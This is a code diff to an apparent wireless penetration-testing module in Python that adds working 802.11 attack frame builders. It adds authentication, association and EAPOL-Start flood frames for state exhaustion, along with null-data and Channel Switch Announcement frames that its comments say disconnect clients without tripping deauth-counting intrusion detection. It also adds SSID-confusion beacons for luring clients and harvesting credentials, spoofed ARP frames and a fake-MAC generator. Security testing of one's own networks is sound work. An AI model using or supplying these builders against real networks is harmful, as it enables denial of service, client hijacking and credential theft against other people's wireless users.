@@ -31,13 +31,20 @@ import time
 from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional, Sequence, Tuple
 
-from .pcap import SUBTYPE_ASSOC_REQ, SUBTYPE_AUTH, SUBTYPE_DEAUTH, SUBTYPE_DISASSOC
+from .pcap import (SUBTYPE_ACTION, SUBTYPE_ASSOC_REQ, SUBTYPE_ASSOC_RESP, SUBTYPE_ATIM,
+                   SUBTYPE_AUTH, SUBTYPE_BEACON, SUBTYPE_DEAUTH, SUBTYPE_DISASSOC,
+                   SUBTYPE_PROBE_REQ, SUBTYPE_PROBE_RESP, SUBTYPE_REASSOC_REQ)
 from .util import mac_norm
 
 __all__ = ["RADIOTAP", "build_radiotap", "EAPOL_LOGOFF", "build_eapol_logoff",
            "build_deauth", "build_qos_eapol", "RawInjector", "injection_available",
            "header_offset", "frame_only", "describe", "eapol_logoff_burst",
-           "ETHERTYPE_EAPOL", "SUBTYPE_NAMES"]
+           "ETHERTYPE_EAPOL", "SUBTYPE_NAMES",
+           # the second wave: state-exhaustion, spoofing and lure frames
+           "build_auth_request", "build_assoc_request", "build_reassoc_request",
+           "build_null_data", "build_eapol_start", "build_probe_request",
+           "build_csa_beacon", "build_probe_response", "build_arp_request", "build_arp_reply", "build_ssid_confusion_beacon",
+           "spoofed_mac", "DATA_SUBTYPES", "DATA_NAMES"]
 
 ETHERTYPE_EAPOL = 0x888E
 
@@ -48,8 +55,13 @@ EAPOL_EAP_PACKET, EAPOL_START, EAPOL_LOGOFF, EAPOL_KEY, EAPOL_ENCAPSULATED_ASF =
 #: LLC/SNAP header with the EAPOL ethertype: every EAPOL frame starts like this
 LLC_SNAP_EAPOL = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"
 
-SUBTYPE_NAMES = {SUBTYPE_ASSOC_REQ: "association request", SUBTYPE_AUTH: "authentication",
-                 SUBTYPE_DEAUTH: "deauthentication", SUBTYPE_DISASSOC: "disassociation"}
+SUBTYPE_NAMES = {
+    SUBTYPE_ASSOC_REQ: "association request", SUBTYPE_ASSOC_RESP: "association response",
+    SUBTYPE_REASSOC_REQ: "reassociation request", SUBTYPE_PROBE_REQ: "probe request",
+    SUBTYPE_PROBE_RESP: "probe response", SUBTYPE_BEACON: "beacon",
+    SUBTYPE_ATIM: "ATIM", SUBTYPE_DISASSOC: "disassociation", SUBTYPE_AUTH: "authentication",
+    SUBTYPE_DEAUTH: "deauthentication", SUBTYPE_ACTION: "action",
+}
 
 #: EAPOL packet types, named: "EAPOL" on its own tells an operator nothing, and the
 #: difference between a Key frame and a Logoff is the whole attack
@@ -149,6 +161,237 @@ def _data_eapol(bssid: str, client: str, payload_type: int, version: int = 1,
     if qos:
         header += b"\x00\x00"                      # QoS control: TID 0, normal ack
     return build_radiotap(rate=2) + header + body
+
+
+# --------------------------------------------------------------------------- #
+# the second wave: frames for the state-exhaustion and spoofing attacks
+# --------------------------------------------------------------------------- #
+
+#: data-frame subtypes this module builds (frame control type 2)
+DATA_SUBTYPES = {"data": 0x00, "null": 0x04, "qos_data": 0x08, "qos_null": 0x0C}
+
+#: data-frame subtype -> the name ``describe`` prints.  A null-data flood is not
+#: "data" in a report: the frame's whole purpose is the bit it does *not* carry.
+DATA_NAMES = {0x00: "data", 0x04: "null data (power save)",
+              0x08: "QoS data", 0x0C: "QoS null data (power save)"}
+
+
+def build_auth_request(bssid: str, client: str, sequence: int = 1,
+                       algorithm: int = 0, status: int = 0) -> bytes:
+    """An open-system authentication request (``seq`` 1) or response.
+
+    ``auth_flood`` sends these from randomised addresses; a single one is also the
+    first step of a fake authentication, which is where ``ap_isolation_audit`` and the
+    WEP injection attacks get their association state from.
+    """
+    header = _mgmt_header(SUBTYPE_AUTH, bssid, client, bssid)
+    body = struct.pack("<HHH", algorithm & 0xFFFF, max(1, int(sequence)) & 0xFFFF,
+                       status & 0xFFFF)
+    return build_radiotap(rate=2) + header + body
+
+
+def _ies(pairs: "Sequence[Tuple[int, bytes]]") -> bytes:
+    return b"".join(bytes([tag & 0xFF, len(value) & 0xFF]) + value
+                    for tag, value in pairs)
+
+
+def build_assoc_request(bssid: str, client: str, ssid: str = "",
+                        capability: int = 0x0431, listen_interval: int = 1,
+                        extra_ies: bytes = b"") -> bytes:
+    """An association request, the frame that fills an AP's association table.
+
+    ``assoc_flood`` sends one per fake station: unlike an authentication flood, the AP
+    has to allocate and hold state for each of them, which is why the *association*
+    table is the resource a state-exhaustion attack actually exhausts.
+    """
+    header = _mgmt_header(SUBTYPE_ASSOC_REQ, bssid, client, bssid)
+    name = ssid.encode("utf-8", "replace")[:32]
+    payload = (struct.pack("<HH", capability & 0xFFFF, listen_interval & 0xFFFF)
+               + _ies([(0, name), (1, b"\x82\x84\x8b\x96\x0c\x12\x18\x24")])
+               + extra_ies)
+    return build_radiotap(rate=2) + header + payload
+
+
+def build_reassoc_request(bssid: str, client: str, current_bssid: str = "",
+                          ssid: str = "", capability: int = 0x0431) -> bytes:
+    """A reassociation request (used by the reassociation half of the assoc flood)."""
+    header = _mgmt_header(SUBTYPE_REASSOC_REQ, bssid, client, bssid)
+    name = ssid.encode("utf-8", "replace")[:32]
+    payload = (struct.pack("<HH", capability & 0xFFFF, 1)
+               + _mac_bytes(current_bssid or bssid)
+               + _ies([(0, name)])
+               + b"\x00\x00")
+    return build_radiotap(rate=2) + header + payload
+
+
+def build_null_data(bssid: str, client: str, qos: bool = True, tid: int = 0,
+                    from_client: bool = True, power_save: bool = False) -> bytes:
+    """A (QoS) Null data frame.
+
+    Null data carries no payload: its only job is to make the *power-management* bit
+    travel, so an AP that believes a client is awake or asleep for long enough drops
+    its state and deauthenticates it.  The trick is that no deauthentication frame is
+    ever sent, which is exactly why a WIDS that counts deauth frames does not see it.
+    """
+    flags = FC_FROM_DS
+    if from_client:
+        flags = FC_TO_DS
+        addr1, addr2, addr3 = bssid, client, bssid
+    else:
+        addr1, addr2, addr3 = client, bssid, bssid
+    subtype = DATA_SUBTYPES["qos_null"] if qos else DATA_SUBTYPES["null"]
+    control, control_flags = frame_control(FC_DATA, subtype, flags)
+    if power_save:
+        control_flags |= 0x10                 # the PS bit is the whole point of the frame
+    header = (struct.pack("<BB", control, control_flags) + b"\x00\x00"
+              + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3)
+              + b"\x00\x00")
+    if qos:
+        header += struct.pack("<H", (tid & 0x0F) | 0x10)     # ack policy: normal
+    return build_radiotap(rate=2) + header
+
+
+def build_eapol_start(bssid: str, client: str, version: int = 1) -> bytes:
+    """An EAPOL-Start: "I am here, begin 802.1X".
+
+    Flooding these from fake supplicant addresses makes an authenticator open and hold
+    EAP sessions it cannot finish, which is the 802.1X analogue of the authentication
+    flood and the reason RADIUS servers fall over before access points do.
+    """
+    body = (LLC_SNAP_EAPOL + bytes([version & 0x03, EAPOL_START]) + b"\x00\x00")
+    control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_TO_DS)
+    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
+              + _mac_bytes(bssid) + _mac_bytes(client) + _mac_bytes(bssid)
+              + b"\x00\x00")
+    return build_radiotap(rate=2) + header + body
+
+
+def build_probe_request(station: str, ssid: str = "", rates: bytes = b"\x82\x84\x8b\x96",
+                        bssid: str = "ff:ff:ff:ff:ff:ff") -> bytes:
+    """A probe request, directed at one SSID (or wildcard when ``ssid`` is empty)."""
+    header = _mgmt_header(SUBTYPE_PROBE_REQ, bssid, station, bssid)
+    name = ssid.encode("utf-8", "replace")[:32]
+    return build_radiotap(rate=2) + header + _ies([(0, name), (1, rates)])
+
+
+def build_probe_response(station: str, bssid: str, ssid: str = "", channel: int = 6,
+                         include_rsn: bool = True) -> bytes:
+    """A probe response — the frame a *Karma* device answers everything with.
+
+    Directed at one station, this is the second half of the "who is lying" test: send
+    a probe request for a name that cannot exist and see which transmitter is
+    impolite enough to answer it.
+    """
+    header = _mgmt_header(SUBTYPE_PROBE_RESP, station, bssid, bssid)
+    body = (b"\x00" * 8 + struct.pack("<H", 100) + struct.pack("<H", 0x0431))
+    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
+           (1, b"\x82\x84\x8b\x96"),
+           (3, bytes([channel & 0xFF]))]
+    if include_rsn:
+        ies.append((48, b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04"
+                        b"\x01\x00\x00\x0f\xac\x02"))
+    return build_radiotap(rate=2) + header + body + _ies(ies)
+
+
+def build_csa_beacon(bssid: str, ssid: str, channel: int = 6, new_channel: int = 1,
+                     count: int = 1, switch_mode: int = 1, capability: int = 0x0431,
+                     include_rsn: bool = False) -> bytes:
+    """A beacon carrying a Channel Switch Announcement (CSA) element.
+
+    The CSA element is how a real AP tells its clients "move to channel N now".  It is
+    a plain management frame, so any transmitter can send it, and clients that follow it
+    leave the network they were on — no deauth frame, and nothing in the log of a WIDS
+    that only counts disconnects.
+    """
+    header = _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid)
+    body = (b"\x00" * 8 + struct.pack("<H", capability & 0xFFFF)
+            + struct.pack("<H", 100) + b"\x00" * 6)         # timestamp, beacon interval
+    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
+           (1, b"\x82\x84\x8b\x96"),
+           (3, bytes([channel & 0xFF])),
+           (37, bytes([switch_mode & 0xFF, (new_channel or 1) & 0xFF,
+                       max(0, int(count)) & 0xFF]))]
+    if include_rsn:
+        ies.append((48, b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04"
+                        b"\x01\x00\x00\x0f\xac\x02"))
+    return build_radiotap(rate=2) + header + body + _ies(ies)
+
+
+def build_ssid_confusion_beacon(bssid: str, ssid: str, channel: int = 6,
+                                capability: int = 0x0431) -> bytes:
+    """A beacon for an existing SSID sent from a different BSSID.
+
+    Clients that remember a network by name alone will try to associate with this
+    transmitter, which is how an attacker harvests credentials or simply steals
+    clients from the real AP.  Nothing about the frame is authenticated.
+    """
+    header = _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid)
+    body = (b"\x00" * 8 + struct.pack("<H", capability & 0xFFFF) + struct.pack("<H", 100)
+            + b"\x00" * 6)
+    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
+           (1, b"\x82\x84\x8b\x96"),
+           (3, bytes([channel & 0xFF]))]
+    return build_radiotap(rate=2) + header + body + _ies(ies)
+
+
+def _arp_frame(sender_mac: str, sender_ip: str, target_mac: str, target_ip: str,
+               opcode: int, bssid: str, dst: bytes, from_client: bool) -> bytes:
+    """The shared half of the two ARP builders: LLC/SNAP + ARP payload + data header."""
+    # ARP is a network-order protocol: hardware type, protocol type and opcode are
+    # all big-endian (a little-endian opcode makes the frame a 0x0200 "unknown" op,
+    # which every stack drops without a word)
+    arp = (b"\x00\x01" + b"\x08\x00" + b"\x06" + b"\x04"
+           + struct.pack(">H", opcode & 0xFFFF)
+           + _mac_bytes(sender_mac) + socket.inet_aton(sender_ip)
+           + _mac_bytes(target_mac) + socket.inet_aton(target_ip))
+    payload = b"\xaa\xaa\x03\x00\x00\x00\x08\x06" + arp
+    if from_client:
+        control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_TO_DS)
+        addr1, addr2, addr3 = bssid, sender_mac, bssid
+    else:                                          # the AP relays it back to a station
+        control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_FROM_DS)
+        addr1, addr2, addr3 = target_mac, bssid, sender_mac
+    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
+              + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3) + b"\x00\x00")
+    return build_radiotap(rate=2) + header + payload
+
+
+def build_arp_request(sender_mac: str, sender_ip: str, target_ip: str,
+                      bssid: str = "", broadcast: bool = True) -> bytes:
+    """An ARP request from a spoofed station, for the client-isolation test.
+
+    Sent to the AP with a *victim's* MAC as the source, a reply means the AP forwards
+    frames between its clients — which is what client isolation is supposed to stop.
+    """
+    from .util import mac_norm as _norm
+
+    target_mac = "ff:ff:ff:ff:ff:ff" if broadcast else _norm(sender_mac)
+    return _arp_frame(sender_mac, sender_ip, target_mac, target_ip, 1,
+                      bssid or "ff:ff:ff:ff:ff:ff",
+                      b"" if broadcast else _mac_bytes(target_mac), from_client=True)
+
+
+def build_arp_reply(sender_mac: str, sender_ip: str, target_mac: str,
+                    target_ip: str, bssid: str = "") -> bytes:
+    """An ARP reply *from a station* — what the isolation test hopes the AP relays."""
+    return _arp_frame(sender_mac, sender_ip, target_mac, target_ip, 2, bssid,
+                      _mac_bytes(target_mac), from_client=True)
+
+
+def spoofed_mac(seed: int, locally_administered: bool = True) -> str:
+    """A deterministic fake station address, for the state-exhaustion attacks.
+
+    Locally-administered by default: a flood of millions of real vendor prefixes would
+    look like the neighbourhood, and a report is easier to read when the fake stations
+    are obviously fake.
+    """
+    value = (seed * 2654435761) & 0xFFFFFFFFFFFF
+    octets = [(value >> (8 * i)) & 0xFF for i in range(6)][::-1]
+    if locally_administered:
+        octets[0] = (octets[0] | 0x02) & 0xFE
+    else:                                     # pragma: no cover - kept for completeness
+        octets[0] &= 0xFC
+    return ":".join(f"{octet:02x}" for octet in octets)
 
 
 def injection_available(interface: str) -> bool:
@@ -298,7 +541,7 @@ def describe(frames: Sequence[bytes]) -> List[Tuple[str, int]]:
         ftype = (control >> 2) & 0x03
         subtype = (control >> 4) & 0x0F
         if ftype == 2:
-            kind = "data"
+            kind = DATA_NAMES.get(subtype, "data")
             base = frame.find(LLC_SNAP_EAPOL, offset)
             if base >= 0:
                 version_at = base + len(LLC_SNAP_EAPOL)
